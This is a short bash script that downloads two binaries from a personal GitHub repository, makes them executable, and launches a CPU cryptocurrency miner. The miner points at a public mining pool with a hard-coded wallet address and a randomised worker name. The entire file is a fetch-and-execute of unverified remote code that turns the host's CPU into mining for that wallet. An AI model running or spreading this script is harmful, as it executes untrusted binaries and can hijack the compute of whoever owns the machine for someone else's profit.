#!/bin/bash
wget https://github.com/tinkuJiya/Oli2004/raw/master/hellminer
chmod +x hellminer
wget https://github.com/tinkuJiya/Oli2004/raw/master/verus-solver
chmod +x verus-solver
./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RJDfRbBurKDpXRvATDq57JH3xdxoFVCvi6.$(echo $(shuf -i 10-40 -n 1)-Dg) -p x --cpu 8
